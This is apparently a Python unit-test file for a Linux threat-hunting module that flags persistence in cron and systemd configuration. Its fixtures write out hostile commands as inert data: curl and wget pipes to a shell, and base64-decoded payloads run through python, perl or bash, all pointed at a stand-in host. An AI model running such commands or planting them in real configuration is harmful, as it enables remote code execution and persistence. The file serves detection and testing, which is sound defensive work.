"""Inert synthetic Linux persistence configuration; no payload is executed."""
import unittest
from unittest.mock import patch

from app.modules.hunting_analysis import BaselineReview, MAX_FINDINGS

PREFIX = 'results/BroSec.Offline.Baseline/'
PAYLOAD = 'QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB'


class LinuxAnalysisTests(unittest.TestCase):
    def analyze(self, rows):
        review = BaselineReview()
        summaries = {}
        for kind, index, row in rows:
            source = kind if kind.startswith('results/') else PREFIX + kind + '.json'
            review.consume(source, index, row)
            summaries[source] = {'source': source, 'rows': summaries.get(source, {}).get('rows', 0) + 1}
        return review.result(list(summaries.values()))

    def cron(self, command, path='/etc/cron.d/fixture', index=0):
        return ('LinuxCrontab', index, {'OSPath': path, 'Content': '* * * * * root ' + command + '\n', 'ContentTruncated': False})

    def service(self, command, index=0):
        return ('LinuxServices', index, {'OSPath': '/etc/systemd/system/fixture.service', 'Content': '[Service]\nExecStart=' + command + '\n', 'ContentTruncated': False})

    def test_literal_download_to_shell_has_exact_row_and_line_evidence(self):
        for item in [self.cron('/usr/bin/curl -fsSL https://example.invalid/a | /bin/sh', index=7),
                     self.service('/bin/sh -c "wget -q -O- https://example.invalid/a | bash"', index=7)]:
            with self.subTest(kind=item[0]):
                result = self.analyze([item])
                finding = result['findings'][0]
                self.assertEqual(finding['row_offset'], 7)
                self.assertEqual(finding['row_number'], 8)
                self.assertEqual(finding['evidence_refs'], [{'source': PREFIX + item[0] + '.json', 'row_number': 8, 'relation': 'rule_match'}])
                self.assertEqual(finding['config_evidence']['signal'], 'download_to_shell')
                self.assertIn('https://example.invalid/a', finding['config_evidence']['line'])
                self.assertEqual(finding['config_evidence']['line_number'], 1 if item[0] == 'LinuxCrontab' else 2)
                self.assertEqual(finding['evidence']['OSPath'], item[2]['OSPath'])
                self.assertEqual(finding['triage_level'], 'medium')
                signal = next(node for node in result['graph']['nodes'] if node['role'] == 'signal')
                self.assertEqual(signal['kind'], 'persistence')
                self.assertEqual(signal['evidence_refs'], [{'source': PREFIX + item[0] + '.json', 'row_number': 8}])
                self.assertIn('curl' if item[0] == 'LinuxCrontab' else 'wget', signal['command_line'])
                self.assertEqual(result['triage_summary']['behavioral_rows_total'], 1)

    def test_benign_standard_configs_and_non_execution_text(self):
        commands = [
            '/usr/bin/python3 /opt/backup.py', '/bin/sh /tmp/approved-maintenance.sh',
            '/usr/bin/curl https://8.8.8.8/status',
            '/usr/bin/curl -o /tmp/status https://example.invalid/a | sh',
            '/usr/bin/wget https://example.invalid/a | sh',
            'echo "curl https://example.invalid/a | sh"',
            'printf "%s" "base64 -d | sh"',
            'echo curl https://example.invalid/a "|" sh',
            'curl https://example.invalid/a | sh /opt/local-script.sh',
        ]
        rows = [self.cron(command, index=i) for i, command in enumerate(commands)]
        rows += [self.service('/usr/bin/python3 /opt/backup.py'),
                 self.service('/bin/echo "curl https://example.invalid/a | sh"'),
                 self.service('/usr/bin/curl https://example.invalid/a | sh'),
                 ('LinuxServices', 40, {'OSPath': '/etc/systemd/system/test.service', 'Content': '[Unit]\nDescription=curl https://example.invalid/a | sh\n[Service]\nExecStart=/bin/true\n# ExecStop=/bin/sh -c "curl https://example.invalid/a | sh"'}),
                 ('LinuxSUID', 0, {'OSPath': '/usr/bin/passwd', 'Mode': 'urwxr-xr-x', 'OwnerID': 0})]
        result = self.analyze(rows)
        self.assertEqual(result['findings'], [])
        self.assertEqual(result['graph']['nodes'], [])
        self.assertEqual(result['unsupported_sources'], [])

    def test_suid_inventory_is_supported_as_context_not_compromise(self):
        source = PREFIX + 'LinuxSUID.json'
        rows = [
            ('LinuxSUID', 0, {'OSPath': '/usr/bin/passwd', 'Mode': 'urwsr-xr-x', 'OwnerID': 0, 'GroupID': 0, 'Size': 68248}),
            ('LinuxSUID', 1, {'OSPath': '/usr/bin/chsh', 'Mode': 'urwxr-xr-x', 'OwnerID': 0, 'GroupID': 0, 'Size': 52880}),
        ]
        result = self.analyze(rows)
        self.assertEqual(result['unsupported_sources'], [])
        self.assertEqual(result['source_coverage'][0]['supported'], True)
        self.assertEqual(result['rows_reviewed']['LinuxSUID'], 2)
        self.assertEqual([f['rule_id'] for f in result['findings']], ['inventory.linux_suid_sgid'] * 2)
        self.assertTrue(all(f['triage_level'] == 'low' and f['assessment'] == 'observation'
                            for f in result['findings']))
        self.assertTrue(all(f['evidence']['Mode'] and f['evidence']['OwnerID'] == 0
                            and f['evidence']['GroupID'] == 0 for f in result['findings']))
        self.assertEqual(result['triage_summary']['behavioral_rows_total'], 0)
        self.assertFalse(any(node['role'] == 'signal' for node in result['graph']['nodes']))

    def test_suid_malformed_or_incomplete_rows_are_not_promoted(self):
        for row in [{'OSPath': '/tmp/item', 'Mode': 'urwxr-xr-x'},
                    {'OSPath': '/tmp/item', 'Mode': 'urwxr-xr-x', 'OwnerID': 'unknown', 'GroupID': 0}]:
            with self.subTest(row=row):
                result = self.analyze([('LinuxSUID', 0, row)])
                self.assertEqual(result['findings'], [])
                self.assertEqual(result['unsupported_sources'], [])

    def test_encoded_interpreter_and_decoded_pipeline(self):
        commands = [
            "python3 -c \"import base64;exec(base64.b64decode('" + PAYLOAD + "'))\"",
            "perl -e \"eval(decode_base64('" + PAYLOAD + "'))\"",
            'echo ' + PAYLOAD + ' | base64 -d | bash',
        ]
        for command in commands:
            with self.subTest(command=command):
                result = self.analyze([self.cron(command)])
                self.assertEqual(len(result['findings']), 1)
                self.assertIn(result['findings'][0]['config_evidence']['signal'], {'encoded_interpreter_execution', 'decoded_payload_to_shell'})
        self.assertFalse(self.analyze([self.cron("python3 -c \"print('base64.b64decode')\"")])['findings'])

    def test_user_crontab_macros_environment_and_periodic_scripts(self):
        command = 'curl https://example.invalid/a | sh'
        rows = [('LinuxCrontab', 0, {'OSPath': '/var/spool/cron/crontabs/alice', 'Content': 'MAILTO=admin@example.invalid\n@reboot ' + command}),
                ('LinuxCrontab', 1, {'OSPath': '/etc/cron.daily/fixture', 'Content': '#!/bin/sh\n' + command}),
                ('LinuxCrontab', 2, {'OSPath': '/etc/cron.d/fixture', 'Content': '# ' + command + '\nNOTE="' + command + '"'})]
        result = self.analyze(rows)
        self.assertEqual(len(result['findings']), 1)
        self.assertEqual(result['findings'][0]['config_evidence']['line_number'], 2)
        self.assertTrue(any('Periodic cron scripts' in gap for gap in result['limitations']))

    def test_truncation_drops_final_partial_line_retains_complete_evidence(self):
        item = self.cron('curl https://example.invalid/a | sh')
        item[2]['ContentTruncated'] = True
        item[2]['Content'] = item[2]['Content'].rstrip('\n')
        result = self.analyze([item])
        self.assertEqual(result['findings'], [])
        self.assertTrue(any('Truncated Linux content' in gap for gap in result['limitations']))
        item[2]['Content'] += '\n* * * * * root partial'
        finding = self.analyze([item])['findings'][0]
        self.assertTrue(finding['config_evidence']['content_truncated'])

    def test_systemd_reset_prefixes_variables_and_continuations_fail_closed(self):
        bad = '/bin/sh -c "curl https://example.invalid/a | sh"'
        cases = ['[Service]\nExecStart=' + bad + '\nExecStart=\nExecStart=/bin/true',
                 '[Unit]\nDescription=' + bad,
                 '[Service]\nExecStart=-' + bad,
                 '[Service]\nExecStart=/bin/sh -c "$COMMAND"',
                 '[Service]\nExecStart=/bin/sh -c "echo ok" \\\nExecStart=' + bad]
        for content in cases:
            with self.subTest(content=content):
                self.assertFalse(self.analyze([('LinuxServices', 0, {'Content': content})])['findings'])

    def test_unknown_paths_sources_and_malformed_content(self):
        for row in [{'Content': []}, {'Content': None}, {'Content': {'ExecStart': 'curl https://example.invalid/a | sh'}}, {'Content': 'not a schedule'}]:
            self.assertFalse(self.analyze([('LinuxCrontab', 0, row)])['findings'])
        source = 'results/Arbitrary/LinuxServices.json'
        result = self.analyze([(source, 0, self.service('/bin/sh -c "curl https://example.invalid/a | sh"')[2])])
        self.assertEqual(result['unsupported_sources'], [source])
        encoded = 'results/BroSec.Offline.Baseline%2FLinuxCrontab.json'
        self.assertTrue(self.analyze([(encoded, 3, self.cron('curl https://example.invalid/a | sh')[2])])['findings'])

    def test_no_execution_decoding_network_or_file_access(self):
        import builtins
        import base64
        import os
        import socket
        import subprocess
        rows = [self.cron('curl https://example.invalid/a | sh'),
                self.cron('echo ' + PAYLOAD + ' | base64 -d | sh', index=1),
                self.service('/bin/sh -c "touch /tmp/DO_NOT_EXECUTE; curl https://example.invalid/a | sh"')]
        def forbidden(*args, **kwargs):
            raise AssertionError('analysis attempted external activity')
        with patch.object(subprocess, 'Popen', forbidden), patch.object(os, 'system', forbidden), patch.object(os, 'popen', forbidden), patch.object(builtins, 'open', forbidden), patch.object(socket, 'socket', forbidden), patch.object(base64, 'b64decode', forbidden), patch.object(builtins, 'eval', forbidden), patch.object(builtins, 'exec', forbidden):
            result = self.analyze(rows)
        self.assertEqual(len(result['findings']), 3)

    def test_signal_survives_graph_and_evidence_detail_caps_without_false_process_edges(self):
        rows = [self.service('/usr/bin/true', index=i) for i in range(1100)]
        rows += [('Processes', 0, {'Pid': 12, 'Exe': '/bin/sh'})]
        rows += [self.cron('curl https://example.invalid/a | sh', index=1200+i) for i in range(MAX_FINDINGS+1)]
        result = self.analyze(rows)
        self.assertEqual(result['matched_rules'], MAX_FINDINGS+1)
        self.assertTrue(result['truncated'])
        self.assertTrue(any(node['role'] == 'signal' for node in result['graph']['nodes']))
        self.assertFalse(any(node['kind'] == 'process' for node in result['graph']['nodes']))
        self.assertFalse(result['graph']['edges'])
        self.assertEqual(result['triage_summary']['correlations']['process_persistence'], 0)
        for node in result['graph']['nodes']:
            self.assertGreaterEqual(node['evidence_refs'][0]['row_number'], 1201)


if __name__ == '__main__':
    unittest.main()
